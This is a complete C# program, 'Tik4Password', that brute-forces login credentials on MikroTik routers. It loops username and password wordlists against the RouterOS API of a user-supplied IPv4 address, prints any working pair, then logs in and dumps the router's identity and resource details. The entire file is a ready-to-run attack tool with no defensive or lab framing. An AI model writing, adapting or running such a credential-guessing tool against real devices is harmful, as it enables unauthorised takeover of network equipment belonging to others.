using System.Text.RegularExpressions;
using tik4net;

Console.WriteLine("Tik4Password v1.1 by mpeirone");
Console.WriteLine();
Console.WriteLine();

List<string> usernames = null;
List<string> passwords = null;
try
{
    usernames = File.ReadAllLines("username.txt").ToList<string>();
}
catch (Exception)
{
    Console.WriteLine("Unable to read username.txt");
}
try
{
    passwords = File.ReadAllLines("password.txt").ToList<string>();
}
catch (Exception)
{
    Console.WriteLine("Unable to read password.txt");
}
if (usernames == null || passwords == null)
{
    Console.ReadLine();
    return;
}


string host = "";
Regex ipV4Regex = new("^(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$");


Console.WriteLine("Insert IPv4 address:");
while (!ipV4Regex.IsMatch((host = Console.ReadLine())))
{
    Console.WriteLine("Invalid IPv4, try again:");
}
Console.WriteLine("Starting attempts...");

var bruteForceResult = BruteforcePassword(host, usernames, passwords);
if (bruteForceResult.Item1 == null || bruteForceResult.Item2 == null)
{
    Console.WriteLine($"Sorry. The password could not be found.");
    Console.ReadLine();
    Environment.Exit(0);
}
Console.WriteLine("Username: " + bruteForceResult.Item1);
Console.WriteLine("Password: " + bruteForceResult.Item2);
Console.WriteLine("####################################");


ITikConnection connection = ConnectionFactory.OpenConnection(TikConnectionType.Api, host, bruteForceResult.Item1, bruteForceResult.Item2);
ITikCommand cmd = connection.CreateCommand("/system/identity/print");
string identity = cmd.ExecuteScalar();
Console.WriteLine("Name: " + identity);
cmd.CommandText = "/system/resource/print";

var resource = cmd.ExecuteList();
foreach (var resourceItem in resource)
{ var splitted = resourceItem.ToString().Split("|");
    foreach (var prop in splitted)
    {
        Console.WriteLine(prop);
    }
}
Console.WriteLine("####################################");
Console.WriteLine("Fine...");

Console.ReadLine();


static (string?, string?) BruteforcePassword(string host, List<string> usernames, List<string> passwords)
{
    foreach (var username in usernames)
    {
        foreach (var password in passwords)
        {
            int result = tryPassword(host, username, password);
            switch (result)
            {
                case 0:
                    return (username, password);
                case 1:
                    break;
                case 2:
                    Console.ReadLine();
                    break;
            }
        }
    }
    return (null, null);
}

static int tryPassword(string host, string username, string password)
{
    try
    {
        ConnectionFactory.OpenConnection(TikConnectionType.Api, host, username, password);
    }
    catch (Exception ex)
    {
        if (ex is tik4net.TikCommandTrapException)
            return 1;
        else
        {
            Console.WriteLine(ex.Message);
            return 2;
        }
    }
    return 0;//password ok
}